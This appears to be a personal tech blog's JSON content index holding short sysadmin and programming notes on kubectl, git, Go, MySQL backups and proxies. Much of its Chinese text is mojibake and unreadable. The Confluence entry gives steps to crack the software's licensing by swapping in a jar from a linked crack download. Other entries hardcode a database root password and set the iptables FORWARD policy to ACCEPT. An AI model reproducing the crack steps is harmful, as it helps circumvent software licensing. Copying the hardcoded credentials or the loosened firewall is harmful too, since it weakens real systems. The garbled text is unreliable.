solutionscompare(time/space)optimal(åŠ å¼ºï¼‰â€¢ Codingï¼ˆå¤šå†™ï¼‰â€¢ Test casesè¢«åŠ¨å¼åé¦ˆï¼ˆé«˜æ‰‹ç»™ä½ æŒ‡ç‚¹ï¼‰code reviewæ•™ç»ƒçœ‹ä½ æ‰“ï¼Œç»™ä½ åé¦ˆ ç®—æ³•å¤æ‚åº¦O(1): Constant Complexity: Constant å¸¸æ•°å¤æ‚åº¦O(log n): Logarithmic Complexity: å¯¹æ•°å¤æ‚åº¦O(n): Linear Complexity: çº¿æ€§æ—¶é—´å¤æ‚åº¦O(n^2): N square Complexity å¹³æ–¹O(n^3): N square Complexity ç«‹æ–¹O(2^n): Exponential Growth æŒ‡æ•°O(n!): Factorial é˜¶ä¹˜","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"htop ç»ˆç«¯æ˜¾ç¤ºé”™ä¹±","slug":"history/tech/5d17f8b4ecb87fca693105cd","date":"2019-06-29T23:48:04.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/tech/5d17f8b4ecb87fca693105cd/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5d17f8b4ecb87fca693105cd/","excerpt":"","text":"1export TERM=linuxhttps://superuser.com/questions/1251360/messed-layout-in-htop","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"python multiprocessing","slug":"history/tech/5d1480f888710ace07bed564","date":"2019-06-26T20:40:24.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/tech/5d1480f888710ace07bed564/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5d1480f888710ace07bed564/","excerpt":"","text":"https://docs.python.org/zh-cn/3.7/library/multiprocessing.html","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"kubernets NodePort æ— æ³•è®¿é—®","slug":"history/tech/5d145abc88710ace07bed563","date":"2019-06-26T17:57:16.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/tech/5d145abc88710ace07bed563/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5d145abc88710ace07bed563/","excerpt":"","text":"å¯åŠ¨redisï¼Œ å¹¶ä»¥ NodePort çš„æ–¹å¼å¯¹å¤–æš´éœ²æœåŠ¡ï¼š12kubectl run redis --image=&apos;redis:alpine&apos;kubectl expose deploy/redis --port=6379 --protocol=TCP --target-port=6379 --name=redis-server-nodeport --type=NodePort é—®é¢˜å¤–éƒ¨è®¿é—®:31572 å’Œ:31572 æ—¶å‡å‡ºç°å¤±è´¥ï¼Œåªæœ‰é€šè¿‡:31572 æ‰å¯æ­£å¸¸è®¿é—® åŸå› ä¸ºäº†å®‰å…¨èµ·è§ï¼Œ docker åœ¨ 1.13 ç‰ˆæœ¬ä¹‹åï¼Œå°†ç³»ç»Ÿiptables ä¸­ FORWARD é“¾çš„é»˜è®¤ç­–ç•¥è®¾ç½®ä¸º DROPï¼Œå¹¶ä¸ºè¿æ¥åˆ° docker0 ç½‘æ¡¥çš„å®¹å™¨æ·»åŠ äº†æ”¾è¡Œè§„åˆ™è§£å†³1iptables -P FORWARD ACCEPT","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"git log","slug":"history/tech/5d13305388710ace07bed562","date":"2019-06-25T20:44:03.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/tech/5d13305388710ace07bed562/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5d13305388710ace07bed562/","excerpt":"","text":"123456git log --all æŸ¥çœ‹æ‰€æœ‰åˆ†æ”¯çš„å†å²git log --all --graph æŸ¥çœ‹å›¾å½¢åŒ–çš„ log åœ°å€git log --oneline æŸ¥çœ‹å•è¡Œçš„ç®€æ´å†å²ã€‚git log --oneline -n4 æŸ¥çœ‹æœ€è¿‘çš„å››æ¡ç®€æ´å†å²ã€‚git log --oneline --all -n4 --graph æŸ¥çœ‹æ‰€æœ‰åˆ†æ”¯æœ€è¿‘ 4 æ¡å•è¡Œçš„å›¾å½¢åŒ–å†å²ã€‚git help --web log è·³è½¬åˆ°git log çš„å¸®åŠ©æ–‡æ¡£ç½‘é¡µ","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"confluence æ–‡æ¡£","slug":"history/tech/5d13304188710ace07bed561","date":"2019-06-25T20:43:45.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/tech/5d13304188710ace07bed561/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5d13304188710ace07bed561/","excerpt":"","text":"https://www.cwiki.us/display/CONF6ZH/Confluence+Data+Model","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"åˆ é™¤è¿‡æœŸæ–‡ä»¶","slug":"history/tech/5d1137320041a3160742a1e1","date":"2019-06-24T20:48:50.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/tech/5d1137320041a3160742a1e1/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5d1137320041a3160742a1e1/","excerpt":"","text":"12#!/bin/bashfind /xxx/workspace -ctime +2 -exec rm -rf &#123;&#125; \\;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"mysql å¤‡ä»½","slug":"history/tech/5d1136f60041a3160742a1e0","date":"2019-06-24T20:47:50.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/tech/5d1136f60041a3160742a1e0/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5d1136f60041a3160742a1e0/","excerpt":"","text":"1234#!/bin/bashdate_str=$(date -d &quot;today&quot; +&quot;%Y%m%d&quot;)mysqldump -u root -h 192.168.1.111 --all-databases -p123456 &gt; /root/.sh/all_$date_str.sql","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"sbt","slug":"history/tech/5d11357c0041a3160742a1df","date":"2019-06-24T20:41:32.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/tech/5d11357c0041a3160742a1df/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5d11357c0041a3160742a1df/","excerpt":"","text":".sbt/repositories1234[repositories]localrepox-maven: http://repox.gtan.com:8078/repox-ivy: http://repox.gtan.com:8078/, [organization]/[module]/(scala_[scalaVersion]/)(sbt_[sbtVersion]/)[revision]/[type]s/[artifact](-[classifier]).[ext]","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"pureftpd","slug":"history/tech/5d1135020041a3160742a1de","date":"2019-06-24T20:39:30.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/tech/5d1135020041a3160742a1de/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5d1135020041a3160742a1de/","excerpt":"","text":"pureftpd","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"Nginx  Nginx-Fancyindex-Theme æ ·å¼æ­å»º","slug":"history/tech/5d11d47b88710ace07bed560","date":"2019-06-24T19:59:55.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/tech/5d11d47b88710ace07bed560/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5d11d47b88710ace07bed560/","excerpt":"","text":"https://www.jianshu.com/p/5b2914c19253","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"Unknown encoder 'libx264'","slug":"history/tech/5d11d40988710ace07bed55f","date":"2019-06-24T19:58:01.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/tech/5d11d40988710ace07bed55f/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5d11d40988710ace07bed55f/","excerpt":"","text":"https://www.it399.com/blog/ffmpeg/201807011724","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"IBMçš„k8sèµ„æ–™","slug":"history/tech/5d10a4203ccad3f8065c9fba","date":"2019-06-23T22:21:20.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/tech/5d10a4203ccad3f8065c9fba/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5d10a4203ccad3f8065c9fba/","excerpt":"","text":"https://developer.ibm.com/cn/tv/2018/opentec-k8s/","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"docker confluence","slug":"history/tech/5d0c2892717f3b4c09d4349a","date":"2019-06-21T00:45:06.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/tech/5d0c2892717f3b4c09d4349a/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5d0c2892717f3b4c09d4349a/","excerpt":"","text":"mysqld é…ç½®ï¼š123456789[mysqld]default-storage-engine=INNODBbinlog_format=rowtransaction-isolation=READ-COMMITTEDinnodb_log_file_size = 2GBmax_allowed_packet = 512Mcharacter-set-server=utf8collation-server=utf8_bin// sql_mode = NO_AUTO_VALUE_ON_ZERO # å¿…é¡»ä¸æŒ‡å®šè¿™ä¸ªå¯åŠ¨ docker1docker-compose up -ddocker-compose.yml:123456789101112confluence: image: &apos;atlassian/confluence-server:latest&apos; restart: always container_name: confluence privileged: true environment: - CATALINA_OPTS=-Xms4G -Xmx4G ports: - &apos;8090:8090&apos; - &apos;8091:8091&apos; volumes: - &apos;/data/confluence:/var/atlassian/application-data/confluence&apos;æ‹·è´ atlassian-extras-decoder-v2-3.4.1.jar åˆ°æœ¬åœ°å¹¶ç ´è§£1docker cp &lt;containerId&gt;:/opt/atlassian/confluence/confluence/WEB-INF/lib/atlassian-extras-decoder-v2-3.4.1.jar ./ç ´è§£æ–‡ä»¶ï¼šhttp://blog.i-driven.com.cn/public/confluence_crack.zipæ‹·è´ç ´è§£æ–‡ä»¶å’Œ mysql é©±åŠ¨æ–‡ä»¶123wget https://cdn.mysql.com//Downloads/Connector-J/mysql-connector-java-5.1.46.tar.gzdocker cp ./atlassian-extras-2.4.jar &lt;containerId&gt;:/opt/atlassian/confluence/confluence/WEB-INF/lib/atlassian-extras-decoder-v2-3.4.1.jardocker cp ./mysql-connector-java-5.1.46/mysql-connector-java-5.1.46-bin.jar &lt;containerId&gt;:/opt/atlassian/confluence/confluence/WEB-INF/lib/é…ç½® mysql æ—¶ï¼Œé€‰æ‹© è¿æ¥å­—ç¬¦ä¸²ï¼š1jdbc:mysql://192.168.1.111:3306/confluence?useUnicode=true&amp;amp;characterEncoding=utf8&amp;amp;useSSL=falseå¦‚æœæœ‰é—®é¢˜ï¼Œå®šä½åˆ° /var/atlassian/application-data/confluence/confluence.cfg.xml, æŸ¥çœ‹ hibernate.connection.url é…ç½®æ˜¯å¦ä¸ä¸Šé¢çš„è¿æ¥å­—ç¬¦ä¸²ä¸€è‡´å‚è€ƒèµ„æ–™ï¼šhttps://zhuanlan.zhihu.com/p/34182497https://blog.whsir.com/post-2997.htmlhttps://www.jianshu.com/p/1813bf05f71e","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"shell ç¼–ç¨‹ linux ç›®å½•ä¸­ç©ºæ ¼çš„é—®é¢˜","slug":"history/tech/5d085c32717f3b4c09d43498","date":"2019-06-18T03:36:18.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/tech/5d085c32717f3b4c09d43498/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5d085c32717f3b4c09d43498/","excerpt":"","text":"shell æŠŠç›®å½• â€œaa bbâ€ è§£ææˆäº†ä¸¤ä¸ªç›®å½•ï¼šç›®å½• â€œaaâ€ å’Œ â€œbbâ€é—®é¢˜çš„åŸå› æ˜¯ Linux å‘½ä»¤è¡Œå·¥å…·å’ŒShelléƒ½æ˜¯é»˜è®¤ä»¥ç©ºæ ¼ã€Tabã€å›è½¦åšä¸ºå€¼ä¸å€¼ä¹‹é—´çš„åˆ†éš”ç¬¦ï¼Œè€Œä¸æ˜¯åšä¸ºæ–‡ä»¶åçš„ä¸€éƒ¨åˆ†ã€‚å¯ä»¥é€šè¿‡ä¿®æ”¹Linuxå‘½ä»¤è¡Œå·¥å…·å’ŒShellçš„é»˜è®¤åˆ†éš”ç¬¦æ¥è§£å†³1234567891011121314151617181920212223#! /bin/bashfunction read_dir()&#123; MY_SAVEIFS=$IFS # IFS=$(echo -en &quot;\\n\\b&quot;) IFS=$&apos;\\n&apos; for file in `ls $1` do if [ -d &quot;$1/$&#123;file&#125;&quot; ];then read_dir &quot;$1/$&#123;file&#125;&quot; else if [ &quot;$&#123;file##*.&#125;&quot; != &quot;mp4&quot; ];then if [ ! -f &quot;$1/$&#123;file&#125;.mp4&quot; ];then ffmpeg -y -i $1&quot;/$file&quot; -c:v libx264 -c:a copy -bsf:a aac_adtstoasc $1&quot;/$file&quot;.mp4 fi fi fi done IFS=$MY_SAVEIFS&#125;#è¯»å–ç¬¬ä¸€ä¸ªå‚æ•°#read_dir $1read_dir /data/tså‚è€ƒèµ„æ–™ï¼šhttps://blog.csdn.net/keypeople/article/details/78147288","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"go Context","slug":"history/tech/5d087e64717f3b4c09d43499","date":"2019-06-17T18:02:12.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/tech/5d087e64717f3b4c09d43499/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5d087e64717f3b4c09d43499/","excerpt":"","text":"æ ¹ Context: é€šè¿‡ context.Background() åˆ›å»ºå­ Context: context.WithCancel(parentContext) åˆ›å»º1ctx, cancel := context.WithCancel(context.Background())å½“å‰ context è¢«å–æ¶ˆæ—¶ åŸºäºå®ƒçš„å­ context éƒ½ä¼šè¢«å–æ¶ˆæ¥å—å–æ¶ˆé€šçŸ¥ &lt;- ctx.Done()ç¤ºä¾‹ä»£ç 12345678910111213141516171819202122232425262728293031323334package cancelimport ( \"context\" \"fmt\" \"testing\" \"time\")func isCancelled(ctx context.Context) bool &#123; select &#123; case &lt;-ctx.Done(): return true default: return false &#125;&#125;func TestCancel(t *testing.T) &#123; ctx, cancel := context.WithCancel(context.Background()) for i := 0; i &lt; 5; i++ &#123; go func(i int, ctx context.Context) &#123; for &#123; if isCancelled(ctx) &#123; break &#125; time.Sleep(time.Millisecond * 5) &#125; fmt.Println(i, \"Cancelled\") &#125;(i, ctx) &#125; cancel() time.Sleep(time.Second * 1)&#125;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"go å¸¸è§å‘","slug":"history/tech/5d06f783717f3b4c09d43496","date":"2019-06-17T02:14:27.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/tech/5d06f783717f3b4c09d43496/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5d06f783717f3b4c09d43496/","excerpt":"","text":"æ•°ç»„å’Œåˆ‡ç‰‡çš„åŒºåˆ«å®¹é‡æ˜¯å¦å¯ä¼¸ç¼©æ˜¯å¦å¯ä»¥è¿›è¡Œæ¯”è¾ƒ UTF-8, unicodeunicode æ˜¯ä¸€ç§å­—ç¬¦é›†ï¼ˆcode pointï¼‰utf-8 æ˜¯ unicode çš„å­˜å‚¨å®ç°(è½¬æ¢ä¸ºå­—èŠ‚åºåˆ—çš„è§„åˆ™)å­—ç¬¦â€œä¸­â€Unicode0x4E2DUTF-80xE4B8ADstring/[]byte[0xE4,0xB8,0xAD] æŒ‰ä½æ¸…é›¶ &amp;^ LSP æ¥å£ä½¿ç”¨åŸåˆ™åªä¾èµ–åŠŸèƒ½æœ€å°çš„æ¥å£ panic vs os.Exitos.Exit é€€å‡ºæ—¶ä¸ä¼šè°ƒç”¨ defer æŒ‡å®šçš„å‡½æ•°os.Exit é€€å‡ºæ—¶ä¸è¾“å‡ºå½“å‰è°ƒç”¨æ ˆä¿¡æ¯ packageæ³¨æ„ä»£ç åœ¨ github ä¸Šçš„ç»„ç»‡å½¢å¼ï¼Œä»¥é€‚åº” go getã€‚ç›´æ¥ä»¥ä»£ç è·¯å¾„å¼€å§‹ï¼Œä¸è¦æœ‰ src Thread vs Groutineåˆ›å»ºæ˜¯é»˜è®¤çš„ stack å¤§å°JDK1.5 ä»¥å java Thread stack é»˜è®¤ä¸º 1MGroutine çš„ stack åˆå§‹åŒ–å¤§å°ä¸º2kå’Œ KSE ï¼ˆKernel Space Entityï¼‰çš„å¯¹åº”å…³ç³»Java Thread æ˜¯ 1:1Groutine æ˜¯ M:N è¡Œä¸ºæ–¹æ³•å®šä¹‰123456789101112131415type Employee struct &#123; Id string Name string Age int&#125;// ç¬¬ä¸€ç§å®šä¹‰æ–¹å¼åœ¨å®ä¾‹å¯¹åº”çš„æ–¹æ³•è¢«è°ƒç”¨æ—¶ï¼Œ å®ä¾‹çš„æˆå‘˜ä¼šè¿›è¡Œå€¼å¤åˆ¶func (e Employee) String() string &#123; return fmt.Sprintf(\"ID:%s-Name%s-Age:%d\", e.Id, e.Name, e.Age)&#125;// é€šå¸¸æƒ…å†µä¸‹ä¸ºäº†é¿å…å†…å­˜æ‹·è´æˆ‘ä»¬ä½¿ç”¨ç¬¬äºŒç§å®šä¹‰æ–¹å¼func (e *Employee) String() string &#123; return fmt.Sprintf(\"ID:%s/Name%s/Age:%d\", e.Id, e.Name, e.Age)&#125; channel çš„å…³é—­å‘å…³é—­çš„ channel å‘é€æ•°æ®ï¼Œä¼šå¯¼è‡´ panicv,ok&lt;-channel ä¸º bool å€¼ï¼Œ true è¡¨ç¤ºæ­£å¸¸æ¥å—ï¼Œ false è¡¨ç¤ºé€šé“å…³é—­æ‰€æœ‰çš„channel æ¥æ”¶è€…éƒ½ä¼šåœ¨ channel å…³é—­æ—¶ï¼Œ ç«‹åˆ»ä»é˜»å¡ç­‰å¾…ä¸­è¿”å›ä¸”ä¸Šè¿° ok å€¼ä¸º falseã€‚è¿™ä¸ªå¹¿æ’­æœºåˆ¶å¸¸è¢«åˆ©ç”¨ï¼Œè¿›è¡Œå‘å¤šä¸ªè®¢é˜…è€…åŒæ—¶å‘å‡ºä¿¡å·ã€‚å¦‚ï¼šé€€å‡ºä¿¡å·ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"packtpub","slug":"history/tech/5d074be8717f3b4c09d43497","date":"2019-06-16T20:14:32.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/tech/5d074be8717f3b4c09d43497/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5d074be8717f3b4c09d43497/","excerpt":"","text":"https://www.packtpub.com/all-products","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":".pip.conf","slug":"history/tech/5d035f9f717f3b4c09d43495","date":"2019-06-13T20:49:35.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/tech/5d035f9f717f3b4c09d43495/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5d035f9f717f3b4c09d43495/","excerpt":"","text":"123456[global]# index-url=http://mirrors.aliyun.com/pypi/simple/index-url = https://pypi.python.org/simple[install]trusted-host=mirrors.aliyun.com","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"è®©SSH/SOCKSæˆä¸ºå…¨å±€ä»£ç†çš„è½¯ä»¶ä»¬ï¼ˆWindows+Linuxï¼‰","slug":"history/tech/5d035f52717f3b4c09d43494","date":"2019-06-13T20:48:18.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/tech/5d035f52717f3b4c09d43494/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5d035f52717f3b4c09d43494/","excerpt":"","text":"Windowsä¸‹çš„æœ‰ï¼šProxifier ä¸‹è½½åœ°å€ProxyCap ä¸‹è½½åœ°å€å‰è€…æ¯”è¾ƒå¥½ç”¨ï¼Œå¯æ§è§„åˆ™è¾ƒå¤šã€‚æˆ‘æ­£åœ¨ä½¿ç”¨ã€‚Linuxä¸‹çš„æœ‰ï¼šproxychains ä¸‹è½½åœ°å€redsocks ä¸‹è½½åœ°å€tsocks ä¸‹è½½åœ°å€http://www.proxifier.com/http://www.proxycap.com/http://proxychains.sourceforge.net/https://github.com/darkk/redsockshttp://tsocks.sourceforge.net/","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"chfs systemdè„šæœ¬","slug":"history/tech/5d035f08717f3b4c09d43493","date":"2019-06-13T20:47:04.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/tech/5d035f08717f3b4c09d43493/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5d035f08717f3b4c09d43493/","excerpt":"","text":"123456789101112[Unit]Description=chfsAfter=network.target remote-fs.target nss-lookup.target[Service]Type=simpleExecStart=/usr/local/bin/chfs --port=8000 --path=/data/--rule=$&#123;RULE&#125;Environment=RULE=::r|time:cuiwentime:r[Install]WantedBy=multi-user.target","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"linux ä»£ç†è®¾ç½®","slug":"history/tech/5d035e9a717f3b4c09d43492","date":"2019-06-13T20:45:14.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/tech/5d035e9a717f3b4c09d43492/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5d035e9a717f3b4c09d43492/","excerpt":"","text":"123456789101112131415161718192021alias proxy=&quot; git config --global http.proxy socks5://127.0.0.1:2080 export http_proxy=http://127.0.0.1:7777 export https_proxy=http://127.0.0.1:7777 export all_proxy=http://127.0.0.1:7777 export no_proxy=localhost,127.0.0.0/8,::1 export HTTP_PROXY=http://127.0.0.1:7777 export HTTPS_PROXY=http://127.0.0.1:7777 export ALL_PROXY=http://127.0.0.1:7777 export NO_PROXY=localhost,127.0.0.0/8,::1&quot;alias unproxy=&quot; git config --global --unset http.proxy unset http_proxy unset https_proxy unset all_proxy unset no_proxy unset HTTP_PROXY unset HTTPS_PROXY unset ALL_PROXY unset NO_PROXY&quot;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"go 